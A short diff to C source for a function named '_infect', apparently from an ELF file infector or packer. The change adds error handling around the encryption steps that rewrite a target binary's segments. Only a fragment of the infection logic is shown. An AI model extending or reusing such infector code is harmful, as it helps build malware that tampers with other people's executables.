@@ -116,11 +116,13 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	bool compressed;
 	//---------- z2 (encryption without compression) -------------
 	compressed = FALSE;
-	encrypt(((*s) + pos + p.cmpr_off), p.cmpr_len, (uint32_t*)key, &compressed);
+	if (encrypt(((*s) + pos + p.cmpr_off), p.cmpr_len, (uint32_t*)key, &compressed) == -1)
+		return FALSE;
 	//---------- z3 (encryption with compression) ----------------
 	compressed = TRUE;
-	uint64_t changed = encrypt(((*s) + pos + p.crypt_off), p.crypt_len, (uint32_t*)key, &compressed);
-
+	int64_t changed = encrypt(((*s) + pos + p.crypt_off), p.crypt_len, (uint32_t*)key, &compressed);
+	if (changed == -1)
+		return FALSE;
 	//reset it
 	elf_shift_offset(*s, *n, pos, p.bn);
 	elf_update_flags_of_load_segments(*s, *n);
